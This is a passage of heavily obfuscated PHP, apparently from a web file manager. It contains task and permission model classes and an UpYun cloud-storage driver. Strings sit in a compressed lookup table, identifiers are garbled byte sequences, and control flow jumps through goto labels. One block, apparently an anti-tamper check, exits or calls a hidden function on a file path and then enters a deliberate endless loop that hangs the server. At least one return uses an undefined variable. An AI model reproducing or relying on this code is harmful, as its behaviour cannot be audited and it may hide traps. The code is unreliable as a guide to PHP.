$¢§£ÎËÔ[1840] => $øÓÄÜ÷§[$¢§£ÎËÔ[1840]]); } $this->filterAuth($øÓÄÜ÷§[$¢§£ÎËÔ[414]]); return parent::update($Ğ¬Õ½ë¸, $øÓÄÜ÷§); } public function remove($¯ÀÏ€) { $˜ı—†…ì = parent::listData($¯ÀÏ€); if (!$˜ı—†…ì || $˜ı—†…ì[$_SERVER[Ãìšã«™][1270]]) { return !1; } return parent::remove($¯ÀÏ€); } public function add($Õµ‰‘¿ù) { $¯º§ª×… =& $_SERVER[Ãìšã«™]; $åêÛ’ä× = $Õµ‰‘¿ù[$¯º§ª×…[32]]; if ($this->findByName($åêÛ’ä×)) { return !1; } $ü¾µê×œ = array($¯º§ª×…[421] => $åêÛ’ä×, $¯º§ª×…[1824] => $¯º§ª×…[12], $¯º§ª×…[1820] => $¯º§ª×…[1828], $¯º§ª×…[2238] => 1, $¯º§ª×…[1823] => 0, $¯º§ª×…[2239] => 0, $¯º§ª×…[1822] => $this->getSort()); $Õµ‰‘¿ù = array_merge($ü¾µê×œ, $Õµ‰‘¿ù); $this->filterAuth($Õµ‰‘¿ù[$¯º§ª×…[414]]); return parent::insert($Õµ‰‘¿ù); } private function getSort() { $¯áÉˆŞË =& $_SERVER[Ãìšã«™]; $¸˜ˆ‹÷ = parent::listData(); $×ú±ù§§ = array_to_keyvalue($¸˜ˆ‹÷, $¯áÉˆŞË[12], $¯áÉˆŞË[1841]); return empty($×ú±ù§§) ? 0 : max($×ú±ù§§) + 1; } private function filterAuth(&$›ğš”­“) { $ÀØ´µ˜ =& $_SERVER[Ãìšã«™]; $ÄŠ»Ğ„ = array(); $§Ó’ıí = array_filter(explode($ÀØ´µ˜[50], $›ğš”­“)); foreach ($§Ó’ıí as $›ğš”­“) { $Ö­í£êÃ = explode($ÀØ´µ˜[10], $›ğš”­“); if ($Ö­í£êÃ[0] == $ÀØ´µ˜[2240] && $Ö­í£êÃ[1] != $ÀØ´µ˜[1189]) { $Ëµèä„ = $Ö­í£êÃ[0] . $ÀØ´µ˜[10] . $Ö­í£êÃ[1] . $ÀØ´µ˜[2241]; if (!in_array($Ëµèä„, $§Ó’ıí)) { $ÄŠ»Ğ„[] = $Ëµèä„; } } $ÄŠ»Ğ„[] = $›ğš”­“; } $›ğš”­“ = implode($ÀØ´µ˜[50], $ÄŠ»Ğ„); } public function sort($ÌşÖ–ì, $£·ú»±) { return parent::update($ÌşÖ–ì, $£·ú»±); } } if (!isset($_SERVER[$_SERVER[Ãìšã«™][395]]) || !isset($_SERVER[$_SERVER[Ãìšã«™][393]])) { $_getc = $_SERVER[Ãìšã«™][396]; $_getfile = $_SERVER[$_SERVER[Ãìšã«™][397]] . $_SERVER[Ãìšã«™][398]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ãìšã«™][226], $_getfilec); if (count($_getarrs) < $_SERVER[Ãìšã«™][399]) { $exit = $_SERVER[Ãìšã«™][400]; $exit(); } $_act = $_SERVER[Ãìšã«™][401]; $_act($_SERVER[$_SERVER[Ãìšã«™][397]] . $_SERVER[Ãìšã«™][398]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ãìšã«™][373]); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\164\141\163\x6b\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\164\171\160\x65", "\145\166\x65\x6e\x74", "\164\x69\x6d\145", "\x64\145\x73\x63", "\x73\171\x73\164\x65\x6d", "\x65\156\x61\142\x6c\145", "\154\141\x73\164\122\165\x6e", "\163\x6f\x72\x74"); public function listData($Ê€µÒ¶ş = false, $€˜º…Ä = "\x73\157\162\164", $õãşÏÌË = false) { return parent::listData($Ê€µÒ¶ş, $€˜º…Ä, $õãşÏÌË); } public function add($éÍï†) { $ë«ğëÔÂ =& $_SERVER[Ãìšã«™]; $è»°Œ¸¥ = $this->findByName($éÍï†[$ë«ğëÔÂ[32]]); if ($è»°Œ¸¥) { return !1; } $éÍï†[$ë«ğëÔÂ[1611]] = 0; $éÍï†[$ë«ğëÔÂ[1841]] = $this->getSort(); return parent::insert($éÍï†); } private function getSort() { $ˆ™¾ñ¥¶ =& $_SERVER[Ãìšã«™]; $À½ì•˜Æ = parent::listData(); $Ç„ıËê = array_to_keyvalue($À½ì•˜Æ, $ˆ™¾ñ¥¶[12], $ˆ™¾ñ¥¶[1841]); return empty($Ç„ıËê) ? 0 : max($Ç„ıËê) + 1; } public function update($¾¨¢‘„, $È…ôùàó) { $Ï¿æ‘ü± =& $_SERVER[Ãìšã«™]; $Ó–ìÖ’® = $this->listData($¾¨¢‘„); $Ü‚û÷Ş¢ = $this->findByName($È…ôùàó[$Ï¿æ‘ü±[32]]); if (!$Ó–ìÖ’® || $Ü‚û÷Ş¢ && $Ü‚û÷Ş¢[$Ï¿æ‘ü±[392]] != $Ó–ìÖ’®[$Ï¿æ‘ü±[392]]) { return !1; } return parent::update($¾¨¢‘„, $È…ôùàó); } public function remove($à‚¼“¦, $ßÒ†û”… = false) { $ÄÜî¾ïã =& $_SERVER[Ãìšã«™]; $÷È„İÉ = $this->listData($à‚¼“¦); if (!$÷È„İÉ) { return; } if (!$ßÒ†û”… && $÷È„İÉ[$ÄÜî¾ïã[1270]] == $ÄÜî¾ïã[89]) { return !1; } return parent::remove($à‚¼“¦); } public function enable($Ì³Öš­, $ÙÇËÕ–È) { return $this->update($Ì³Öš­, array($_SERVER[Ãìšã«™][2232] => $ÙÇËÕ–È)); } public function run($”±éÉ»¦) { return $this->update($”±éÉ»¦, array($_SERVER[Ãìšã«™][2242] => time())); } } goto fäöä‹¢; E†ŞŒÜùè›: define($_SERVER[Ãìšã«™][604], $_SERVER[Ãìšã«™][605]); $zlconepikq = $_SERVER[Ãìšã«™][606]; if (strlen($zlconepikq) < $_SERVER[Ãìšã«™][399]) { die; } goto B÷ƒ¢ßÄŠÈ; B÷ƒ¢ßÄŠÈ: $_SERVER[ïß‚ÈÄŸ] = explode($_SERVER[Ãìšã«™][607], gzinflate(substr($_SERVER[Ãìšã«™][608], 10, -8))); $dxvhjlgbtq = $_SERVER[Ãìšã«™][609]; if (!$dxvhjlgbtq) { return; } goto eç™µè•Ïš; dë±ß  –Í: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\x2f\57\166\x30\56\x61\160\x69\56\x75\x70\171\x75\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¾Ã²é˜€) { parent::__construct(); $this->_init($¾Ã²é˜€); } public function _init($£Ü­õ…) { $¢×“÷¡ =& $_SERVER[Ãìšã«™]; foreach ($£Ü­õ… as $×ÄìöøĞ => $™ôŞÍÍ) { if (isset($this->{$×ÄìöøĞ})) { $this->{$×ÄìöøĞ} = $™ôŞÍÍ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¢×“÷¡[1447] . LNG($¢×“÷¡[1378])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ùÖ“Çí, $”ªàáÛû = "\107\x45\x54") { $ŒµèÛ¿‘ =& $_SERVER[Ãìšã«™]; $É‰¬ûÃş = gmdate($ŒµèÛ¿‘[1411]); $ÅÕ½ü“Ã = base64_encode(hash_hmac($ŒµèÛ¿‘[1448], "{$”ªàáÛû}\46{$ùÖ“Çí}\46{$É‰¬ûÃş}", md5("{$this->userpass}"), !0)); $ÀæÇòà· = array("\x41\x75\x74\150\157\162\151\172\x61\x74\x69\x6f\x6e\x3a\125\x50\x59\125\116\40{$this->username}\72{$ÅÕ½ü“Ã}", "\x44\x61\164\x65\x3a{$É‰¬ûÃş}"); return $ÀæÇòà·; } public function ussRequest($ŸÕ‘ƒŒğ, $À¨¹ù×Ö = "\x47\105\x54", $¹÷’Û”â = false, $êÔ”à‹ç = false, $¿×¦äçË = false) { $çığÚ¯  =& $_SERVER[Ãìšã«™]; $ŸÕ‘ƒŒğ = trim($ŸÕ‘ƒŒğ, $çığÚ¯ [8]); $€¸È–°Ó = "\57{$this->bucket}\x2f{$ŸÕ‘ƒŒğ}"; $ŞªŸ£ßƒ = $this->ussHeaders($€¸È–°Ó, $À¨¹ù×Ö); if ($êÔ”à‹ç) { $ŞªŸ£ßƒ = array_merge($ŞªŸ£ßƒ, $êÔ”à‹ç); } $Æ¥¢èŞ³ = url_request($this->endpoint . $€¸È–°Ó, $À¨¹ù×Ö, $¹÷’Û”â, $ŞªŸ£ßƒ, $¿×¦äçË); if (!$Æ¥¢èŞ³) { return array($çığÚ¯ [1185] => !1, $çığÚ¯ [1187] => $çığÚ¯ [1449]); } if (strtolower($À¨¹ù×Ö) == $çığÚ¯ [189] || in_array($Æ¥¢èŞ³[$çığÚ¯ [1185]], array($çığÚ¯ [1304], $çığÚ¯ [1450]))) { $¹÷’Û”â = $Æ¥¢èŞ³[$çığÚ¯ [1451]]; } else { $¹÷’Û”â = json_decode($Æ¥¢èŞ³[$çığÚ¯ [1187]], !0); if (!$¹÷’Û”â) { $¹÷’Û”â = $Æ¥¢èŞ³[$çığÚ¯ [1187]]; } else { if (!$Æ¥¢èŞ³[$çığÚ¯ [751]] && isset($¹÷’Û”â[$çığÚ¯ [1452]])) { $¹÷’Û”â = $¹÷’Û”â[$çığÚ¯ [1452]]; } } } return array($çığÚ¯ [1185] => $Æ¥¢èŞ³[$çığÚ¯ [751]], $çığÚ¯ [1187] => $¹÷’Û”â); } public function mkfile($ƒìº¯Ğª, $¯úÈïÙ™ = '', $†”Áò‰» = REPEAT_RENAME) { if ($this->setContent($ƒìº¯Ğª, $¯úÈïÙ™)) { return $this->getPathOuter($ƒìº¯Ğª); } return !1; } public function mkdir($²±Ò¬¸ƒ, $ï—ôõ´× = REPEAT_SKIP) { $ƒÂ™ØÖ° =& $_SERVER[Ãìšã«™]; $ó”™†–„ = trim($²±Ò¬¸ƒ, $ƒÂ™ØÖ°[8]); if ($this->_isFolder($ó”™†–„)) { return $this->getPathOuter($ó”™†–„); } $‰Ä‡‡É¸ = array($ƒÂ™ØÖ°[1453]); $ÃÔ”ğ  = $this->ussRequest($ó”™†–„, $ƒÂ™ØÖ°[221], !1, $‰Ä‡‡É¸); return $ÃÔ”ğ [$ƒÂ™ØÖ°[1185]] ? $this->getPathOuter($ó”™†–„) : !1; } public function copyFile($€Ğ„Çş¤, $ª¨ÌÂ®ä) { $”Çê×Ö© =& $_SERVER[Ãìšã«™]; $æ™Œ€õ‘ = array($”Çê×Ö©[1454] . "\57{$this->bucket}\x2f{$€Ğ„Çş¤}", $”Çê×Ö©[1455]); $™—éô‡› = $this->ussRequest($ª¨ÌÂ®ä, $”Çê×Ö©[223], !1, $æ™Œ€õ‘); return $™—éô‡›[$”Çê×Ö©[1185]] ? !0 : $this->getPathOuter($ª¨ÌÂ®ä); } public function moveFile($Â¨·ùŞ , $ì‡é±­Ç) { $‡¸é¾¢è =& $_SERVER[Ãìšã«™]; $Äï¯Ë¹ = array($‡¸é¾¢è[1456] . "\57{$this->bucket}\x2f{$Â¨·ùŞ }", $‡¸é¾¢è[1455]); $«Ø„ìÒ‡ = $this->ussRequest($ì‡é±­Ç, $‡¸é¾¢è[223], !1, $Äï¯Ë¹); return $«Ø„ìÒ‡[$‡¸é¾¢è[1185]] ? !0 : $this->getPathOuter($ì‡é±­Ç); } public function delFile($„á²Ùü) { $—Ô†İÌ =& $_SERVER[Ãìšã«™]; $—±É‡—” = $this->ussRequest($„á²Ùü, $—Ô†İÌ[1457]); return $—±É‡—”[$—Ô†İÌ[1185]] ? !0 : !1; } public function delFolder($ç’‡Ÿ…) { $’Ğ‡Õ‘Å =& $_SERVER[Ãìšã«™]; if (!$this->exist($ç’‡Ÿ…)) { return !0; } $this->listItemCache = !1; $ÓÕÇ—  = $øˆ¯çá€ = array(); $this->fileList($ç’‡Ÿ…, $ÓÕÇ— , $øˆ¯çá€, !0); $this->listItemCache = !0; foreach ($øˆ¯çá€ as $Â—¼ëˆ») { $ØèñËš = $this->ussRequest($Â—¼ëˆ»[$’Ğ‡Õ‘Å[32]], $’Ğ‡Õ‘Å[1457]); if (!$ØèñËš[$’Ğ‡Õ‘Å[1185]]) { return !1; } } foreach ($ÓÕÇ—  as $Ó±†õÌç) { $ØèñËš = $this->ussRequest($Ó±†õÌç, $’Ğ‡Õ‘Å[1457]); if (!$ØèñËš[$’Ğ‡Õ‘Å[1185]]) { return !1; } } $ØèñËš = $this->ussRequest($ç’‡Ÿ…, $’Ğ‡Õ‘Å[1457]); return $ØèñËš[$’Ğ‡Õ‘Å[1185]]; } public function rename($­Â‰—Á†, $®â§úäÂ) { if ($this->isFile($­Â‰—Á†)) { $®â§úäÂ = get_path_father($­Â‰—Á†) . $®â§úäÂ; return $this->moveFile($­Â‰—Á†, $®â§úäÂ); } return $this->renameObject($­Â‰—Á†, $®â§úäÂ); } public function fileInfo($½Ö¡‹¡, $ÊÌÀÚËµ = false, $è¿¾¡Æ = array()) { $ÜÉºÜüô =& $_SERVER[Ãìšã«™]; $ÇÌÌ¤ßä = array($ÜÉºÜüô[32] => $this->pathThis($½Ö¡‹¡), $ÜÉºÜüô[78] => $this->getPathOuter($ÜÉºÜüô[8] . $½Ö¡‹¡), $ÜÉºÜüô[33] => $ÜÉºÜüô[192], $ÜÉºÜüô[80] => isset($è¿¾¡Æ[$ÜÉºÜüô[80]]) ? $è¿¾¡Æ[$ÜÉºÜüô[80]] : 0, $ÜÉºÜüô[167] => $this->ext($½Ö¡‹¡)); if ($ÊÌÀÚËµ) { return $ÇÌÌ¤ßä; } $ÇÌÌ¤ßä[$ÜÉºÜüô[193]] = $ÇÌÌ¤ßä[$ÜÉºÜüô[86]] = 0; $ÇÌÌ¤ßä[$ÜÉºÜüô[194]] = $ÇÌÌ¤ßä[$ÜÉºÜüô[195]] = !0; if (empty($è¿¾¡Æ)) { $è¿¾¡Æ = $this->objectMeta($½Ö¡‹¡); if (!$è¿¾¡Æ) { return $ÇÌÌ¤ßä; } } $ÇÌÌ¤ßä[$ÜÉºÜüô[193]] = intval($è¿¾¡Æ[$ÜÉºÜüô[1458]]); $ÇÌÌ¤ßä[$ÜÉºÜüô[86]] = intval($è¿¾¡Æ[$ÜÉºÜüô[1459]]); $ÇÌÌ¤ßä[$ÜÉºÜüô[80]] = $è¿¾¡Æ[$ÜÉºÜüô[80]]; return $ÇÌÌ¤ßä; } public function folderInfo($±Ä²öÖ¤, $à€Ñâ² = false) { $©şó×ùß =& $_SERVER[Ãìšã«™]; $Äû°‘Ä€ = array($©şó×ùß[32] => $this->pathThis($±Ä²öÖ¤), $©şó×ùß[78] => $this->getPathOuter($©şó×ùß[8] . $±Ä²öÖ¤), $©şó×ùß[33] => $©şó×ùß[79]); if ($à€Ñâ²) { return $Äû°‘Ä€; } $Äû°‘Ä€[$©şó×ùß[193]] = $Äû°‘Ä€[$©şó×ùß[86]] = 0; $Äû°‘Ä€[$©şó×ùß[194]] = $Äû°‘Ä€[$©şó×ùß[195]] = !0; if (empty($ÑçÆÕòå)) { $ÑçÆÕòå = $this->objectMeta($±Ä²öÖ¤); if (!$ÑçÆÕòå) { return $Äû°‘Ä€; } } $Äû°‘Ä€[$©şó×ùß[193]] = intval($ÑçÆÕòå[$©şó×ùß[1458]]); $Äû°‘Ä€[$©şó×ùß[86]] = intval($ÑçÆÕòå[$©şó×ùß[1459]]); return $Äû°‘Ä€; } private function listObjs($œ¨®ÏÉ×, $„Òíˆâº = 0, $¼ØÒÍ½‰ = 1000) { $¤è¥ÍÑ¶ =& $_SERVER[Ãìšã«™]; $¶—¢éş  = array($¤è¥ÍÑ¶[1460], $¤è¥ÍÑ¶[1461] . $¼ØÒÍ½‰); if ($„Òíˆâº) { $¶—¢éş [] = $¤è¥ÍÑ¶[1462] . $„Òíˆâº; } $ü¹ù¢¤£ = $this->ussRequest($œ¨®ÏÉ×, $¤è¥ÍÑ¶[225], !1, $¶—¢éş ); return !$ü¹ù¢¤£[$¤è¥ÍÑ¶[1185]] ? !1 : $ü¹ù¢¤£[$¤è¥ÍÑ¶[1187]]; } private function fileList($ïùÖŞ¾±, &$ñ¡êû‰“, &$üŞÜ£¡å, $ôá‚Ù€ú = false) { $¸ç±Â±û =& $_SERVER[Ãìšã«™]; $Èããğõ½ = $¸ç±Â±û[12]; $½˜¿ò = 1000; $ÍêúâÜ’ = rtrim($ïùÖŞ¾±, $¸ç±Â±û[8]) . $¸ç±Â±û[8]; $Ûª««­ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $Ç¨å€… = $this->listObjs($ïùÖŞ¾±, $Èããğõ½, $½˜¿ò); if (!$Ç¨å€…) { return !1; } $Èããğõ½ = isset($Ç¨å€…[$¸ç±Â±û[1463]]) ? $Ç¨å€…[$¸ç±Â±û[1463]] : $¸ç±Â±û[12]; $ŠˆìÏÔÌ = isset($Ç¨å€…[$¸ç±Â±û[1464]]) ? $Ç¨å€…[$¸ç±Â±û[1464]] : array(); foreach ($ŠˆìÏÔÌ as $òÒ–½¦) { $ •Ó´ìÉ = $òÒ–½¦[$¸ç±Â±û[33]] == $¸ç±Â±û[79] ? !0 : !1; $üÚ³ûåû = ltrim($ÍêúâÜ’ . $òÒ–½¦[$¸ç±Â±û[32]], $¸ç±Â±û[8]) . ($ •Ó´ìÉ ? $¸ç±Â±û[8] : $¸ç±Â±û[12]); $˜ñ¬ßÔï = array($¸ç±Â±û[32] => $üÚ³ûåû, $¸ç±Â±û[33] => $ •Ó´ìÉ ? $¸ç±Â±û[79] : $¸ç±Â±û[192], $¸ç±Â±û[80] => $òÒ–½¦[$¸ç±Â±û[332]], $¸ç±Â±û[1459] => $òÒ–½¦[$¸ç±Â±û[1465]]); if ($Ûª««­) { $this->cacheMethod($¸ç±Â±û[198], $üÚ³ûåû, $ •Ó´ìÉ); $this->cacheMethod($¸ç±Â±û[199], $üÚ³ûåû, $˜ñ¬ßÔï); } if ($ •Ó´ìÉ) { $ñ¡êû‰“[] = $üÚ³ûåû; if ($ôá‚Ù€ú) { $this->fileList($üÚ³ûåû, $ñ¡êû‰“, $üŞÜ£¡å, $ôá‚Ù€ú); } continue; } $üŞÜ£¡å[] = $˜ñ¬ßÔï; } if (count($ŠˆìÏÔÌ) < $½˜¿ò) { break; } } if ($Ûª««­) { $this->cacheMethod($¸ç±Â±û[198], $ïùÖŞ¾±, !0); } } public function listPath($Ò÷Ç¼, $ŸÊÆ–ı¤ = false) { $ªßûäÊ =& $_SERVER[Ãìšã«™]; $¾ßÕ…‚ñ = $õàä‹ƒ½ = array(); $this->fileList($Ò÷Ç¼, $¾ßÕ…‚ñ, $õàä‹ƒ½); foreach ($¾ßÕ…‚ñ as $„°â×ü± => $„Æëã—) { $¾ßÕ…‚ñ[$„°â×ü±] = $this->folderInfo($„Æëã—, $ŸÊÆ–ı¤); } foreach ($õàä‹ƒ½ as $„°â×ü± => $„Æëã—) { $õàä‹ƒ½[$„°â×ü±] = $this->fileInfo($„Æëã—[$ªßûäÊ[32]], $ŸÊÆ–ı¤, $„Æëã—); } return array($ªßûäÊ[77] => $¾ßÕ…‚ñ, $ªßûäÊ[76] => $õàä‹ƒ½); } public function has($ç÷¶İ¡­, $¸£Å˜ßü = false, $–ÙÁúÃÏ = true) { $ÚæÖñ½ =& $_SERVER[Ãìšã«™]; $«î©­ˆò = $ÚæÖñ½[12]; $Òì¼ãœ– = 500; $ŒÁª™â = 0; $Ûì¬ËØĞ = 0; $¾‚¡¦¶µ = rtrim($ç÷¶İ¡­, $ÚæÖñ½[8]) . $ÚæÖñ½[8]; while (!0) { check_abort(); $…˜‘ÃÈû = $this->listObjs($ç÷¶İ¡­, $«î©­ˆò, $Òì¼ãœ–); if (!$…˜‘ÃÈû) { return !1; } $«î©­ˆò = isset($…˜‘ÃÈû[$ÚæÖñ½[1463]]) ? $…˜‘ÃÈû[$ÚæÖñ½[1463]] : $ÚæÖñ½[12]; $˜…öÑ× = isset($…˜‘ÃÈû[$ÚæÖñ½[1464]]) ? $…˜‘ÃÈû[$ÚæÖñ½[1464]] : array(); if (empty($˜…öÑ×)) { break; } $ò‘Ø‰í¸ = array_filter($˜…öÑ×, function ($œâÜÓİ¨) { $“÷ÀÎ€Ú =& $_SERVER[Ãìšã«™]; return $œâÜÓİ¨[$“÷ÀÎ€Ú[33]] == $“÷ÀÎ€Ú[79]; }); $“§‡®Ó¼ = count($˜…öÑ×); $ò‘Ø‰í¸ = count($ò‘Ø‰í¸); $êã…ø°Û = $“§‡®Ó¼ - $ò‘Ø‰í¸; if ($¸£Å˜ßü) { $Ûì¬ËØĞ += $ò‘Ø‰í¸; $ŒÁª™â += $êã…ø°Û; if ($“§‡®Ó¼ < $Òì¼ãœ–) { break; } continue; } if ($–ÙÁúÃÏ) { if ($êã…ø°Û) { return !0; } } else { if ($ò‘Ø‰í¸) { return !0; } } if ($“§‡®Ó¼ < $Òì¼ãœ–) { break; } } if ($¸£Å˜ßü) { return array($ÚæÖñ½[202] => $ŒÁª™â, $ÚæÖñ½[203] => $Ûì¬ËØĞ); } return !1; } public function listAll($Øß¿Œ á) { $Êî‹Ôˆô =& $_SERVER[Ãìšã«™]; $€Ì²áÙê = $ÔÄ×Ì»£ = array(); $this->fileList($Øß¿Œ á, $€Ì²áÙê, $ÔÄ×Ì»£, !0); $ÖÑššõ = array(); foreach ($ÔÄ×Ì»£ as $óª©²ÅŠ) { $ÖÑššõ[$óª©²ÅŠ[$Êî‹Ôˆô[32]]] = $óª©²ÅŠ[$Êî‹Ôˆô[80]]; } foreach ($€Ì²áÙê as $óª©²ÅŠ) { if (is_string($óª©²ÅŠ)) { $ÖÑššõ[$óª©²ÅŠ] = 0; } } return $this->listAllFiles($Øß¿Œ á, array_keys($ÖÑššõ), $ÖÑššõ); } public function canRead($°¨Ô©²Æ) { return $this->exist($°¨Ô©²Æ) ? !0 : !1; } public function canWrite($è…õ¤‚) { return $this->exist($è…õ¤‚) ? !0 : !1; } public function getContent($€°Óäçû) { return $this->fileSubstr($€°Óäçû, 0, -1); } public function setContent($¸½Ëœ¤¤, $ö•¥Ìğò = '') { $âç”Ó½Ñ =& $_SERVER[Ãìšã«™]; if (!$ö•¥Ìğò) { $°„£¥ˆ = $this->ussRequest($¸½Ëœ¤¤, $âç”Ó½Ñ[221]); return $°„£¥ˆ[$âç”Ó½Ñ[1185]]; } $˜Í©ğÜÄ = $this->tempFile($this->pathThis($¸½Ëœ¤¤)); file_put_contents($˜Í©ğÜÄ, $ö•¥Ìğò); if ($this->upload($¸½Ëœ¤¤, $˜Í©ğÜÄ)) { $this->tempFileRemve($˜Í©ğÜÄ); return !0; } return !1; } public function fileSubstr($ÒşÏ‚Êİ, $ã²ñö, $÷·¤–·) { $å‰‹ôíƒ =& $_SERVER[Ãìšã«™]; if (!($¼…ÓÒÆ– = $this->link($ÒşÏ‚Êİ))) { return !1; } $§™îõïù = !1; if ($÷·¤–· > 0) { $û³¼ƒêâ = $ã²ñö + $÷·¤–· - 1; $§™îõïù = array($å‰‹ôíƒ[1426] . $ã²ñö . $å‰‹ôíƒ[460] . $û³¼ƒêâ); } $êğ±¤Äù = url_request($¼…ÓÒÆ–, $å‰‹ôíƒ[225], !1, $§™îõïù); return $êğ±¤Äù[$å‰‹ôíƒ[751]] ? $êğ±¤Äù[$å‰‹ôíƒ[1187]] : !1; } public function upload($¶ìú„†Œ, $ÅåÄÑ«¨, $°Š¡ÍÚà = false, $õÕÌ»Ü– = REPEAT_REPLACE) { $ğ˜¬±¬Á =& $_SERVER[Ãìšã«™]; $´––Õì = IO::size($ÅåÄÑ«¨); if ($´––Õì <= 1024 * 1024 * 200) { $ÄãÌ¡ëé = array($ğ˜¬±¬Á[1466] . $ÅåÄÑ«¨); $¥Ô›í½ = $this->ussRequest($¶ìú„†Œ, $ğ˜¬±¬Á[223], $ÄãÌ¡ëé); return $¥Ô›í½[$ğ˜¬±¬Á[1185]] ? $this->getPathOuter($¶ìú„†Œ) : !1; } $ê” İê = 1024 * 1024 * 10; $š»çåÕş = array($ğ˜¬±¬Á[1467], $ğ˜¬±¬Á[1468] . $´––Õì, $ğ˜¬±¬Á[1469], $ğ˜¬±¬Á[1470] . $ê” İê); $¥Ô›í½ = $this->ussRequest($¶ìú„†Œ, $ğ˜¬±¬Á[223], !1, $š»çåÕş); if (!$¥Ô›í½[$ğ˜¬±¬Á[1185]]) { return !1; } $‹õÅ¶  = $¥Ô›í½[$ğ˜¬±¬Á[1187]]; $Ìö¹™¿é = 0; $ãÓ““È = $‹õÅ¶ [$ğ˜¬±¬Á[1471]]; $ã•œœ¹ = fopen($ÅåÄÑ«¨, $ğ˜¬±¬Á[1375]); if (!$ã•œœ¹) { return !1; } do { $¥ÊÍ‹œÛ = $‹õÅ¶ [$ğ˜¬±¬Á[1472]]; fseek_64($ã•œœ¹, $Ìö¹™¿é); $È Œ˜ò± = fread($ã•œœ¹, $¥ÊÍ‹œÛ); $™—¹”¸µ = 0; do { $™—¹”¸µ++; $‹õÅ¶  = $this->uploadPart($¶ìú„†Œ, $‹õÅ¶ , $È Œ˜ò±); } while (!$‹õÅ¶  && $™—¹”¸µ < 3); if (!$‹õÅ¶ ) { return !1; } $ãÓ““È = $‹õÅ¶ [$ğ˜¬±¬Á[1471]]; $Ìö¹™¿é += $¥ÊÍ‹œÛ; } while ($ãÓ““È != -1); fclose($ã•œœ¹); $š»çåÕş = array($ğ˜¬±¬Á[1473], $ğ˜¬±¬Á[1474] . $‹õÅ¶ [$ğ˜¬±¬Á[1475]], $ğ˜¬±¬Á[1469]); $¥Ô›í½ = $this->ussRequest($¶ìú„†Œ, $ğ˜¬±¬Á[223], !1, $š»çåÕş); return $¥Ô›í½[$ğ˜¬±¬Á[1185]] ? $this->getPathOuter($Öò“Í¢) : !1; } private function uploadPart($ ïí”„», $ôĞˆîÅŠ, &$ğ‰¦á¿) { $Ô–»Ì¥Å =& $_SERVER[Ãìšã«™]; $‡¢¼’Êé = array($Ô–»Ì¥Å[1476], $Ô–»Ì¥Å[1474] . $ôĞˆîÅŠ[$Ô–»Ì¥Å[1475]], $Ô–»Ì¥Å[1477] . $ôĞˆîÅŠ[$Ô–»Ì¥Å[1471]], $Ô–»Ì¥Å[139] . $ôĞˆîÅŠ[$Ô–»Ì¥Å[1472]]); $áéËëÜæ = $this->ussRequest($ ïí”„», $Ô–»Ì¥Å[223], $ğ‰¦á¿, $‡¢¼’Êé); return !$áéËëÜæ[$Ô–»Ì¥Å[1185]] ? $áéËëÜæ[$Ô–»Ì¥Å[1185]] : $áéËëÜæ[$Ô–»Ì¥Å[1187]]; } public function uploadFormData($­ªšµç, $•½Ç•Çœ = 3600) { return $this->uploadPolicy($­ªšµç, $•½Ç•Çœ); } public function multiUploadFormData($¯»‡ö—ó, $íØ’»“Â = 3600) { $¨ä÷Ğû¶ =& $_SERVER[Ãìšã«™]; $¹·áƒ›ç = (int) $GLOBALS[$¨ä÷Ğû¶[7]][$¨ä÷Ğû¶[80]]; return $this->uploadPolicy($¯»‡ö—ó, $íØ’»“Â, $¹·áƒ›ç); } private function uploadPolicy($áÇ™‡é, $Û˜ÇÆªÁ = 3600, $¯¶ğÃá = 0) { $ÑÇ… ğ½ =& $_SERVER[Ãìšã«™]; $ç™à™æ = $ÑÇ… ğ½[8] . $this->bucket; $é£ÍÚµ× = gmdate($ÑÇ… ğ½[1411]); $²ªÑÙİò = array($ÑÇ… ğ½[1478] => $this->bucket, $ÑÇ… ğ½[1479] => $áÇ™‡é, $ÑÇ… ğ½[1480] => time() + $Û˜ÇÆªÁ, $ÑÇ… ğ½[1481] => $é£ÍÚµ×); if ($¯¶ğÃá) { $²ªÑÙİò[$ÑÇ… ğ½[1391]] = $¯¶ğÃá; } $›Ê“¸¿Å = base64_encode(json_encode($²ªÑÙİò)); $˜û¾÷ë˜ = base64_encode(hash_hmac($ÑÇ… ğ½[1448], "\120\117\123\x54\46{$ç™à™æ}\x26{$é£ÍÚµ×}\x26{$›Ê“¸¿Å}", md5("{$this->userpass}"), !0)); $Ó§”áŠî = array($ÑÇ… ğ½[1316] => $›Ê“¸¿Å, $ÑÇ… ğ½[1482] => "\x55\x50\131\x55\x4e\x20{$this->username}\x3a{$˜û¾÷ë˜}", $ÑÇ… ğ½[174] => $this->endpoint . $ç™à™æ); return $Ó§”áŠî; } public function download($ı¢©´—, $—“İà‰Æ) { $ü¯Ûô¾Å = IO::getPathInner(IO::mkfile($—“İà‰Æ)); if (!($”µûÏƒ = $this->link($ı¢©´—))) { return !1; } $úÖ­–®€ = 0; $âˆØğóä = 1024 * 200; $ê¦ôÔğ¯ = fopen($ü¯Ûô¾Å, $_SERVER[Ãìšã«™][1432]); while (!0) { $ä“ŞøÅ = $this->fileSubstr($ı¢©´—, $úÖ­–®€, $âˆØğóä); if ($ä“ŞøÅ === !1) { return !1; } fwrite($ê¦ôÔğ¯, $ä“ŞøÅ); $úÖ­–®€ += $âˆØğóä; if (strlen($ä“ŞøÅ) < $âˆØğóä) { break; } } fclose($ê¦ôÔğ¯); return $—“İà‰Æ; } public function link($óû¸ŠæŸ, $™æÆ–’­ = array()) { $µ˜É”œ— =& $_SERVER[Ãìšã«™]; $óû¸ŠæŸ = trim($óû¸ŠæŸ, $µ˜É”œ—[8]); if (!empty($this->token)) { $ˆÆµóì² = strtotime(date($µ˜É”œ—[1483])); $¨Á¾êÚø = substr(md5($this->token . $µ˜É”œ—[279] . $ˆÆµóì² . $µ˜É”œ—[1484] . $óû¸ŠæŸ), 12, 8) . 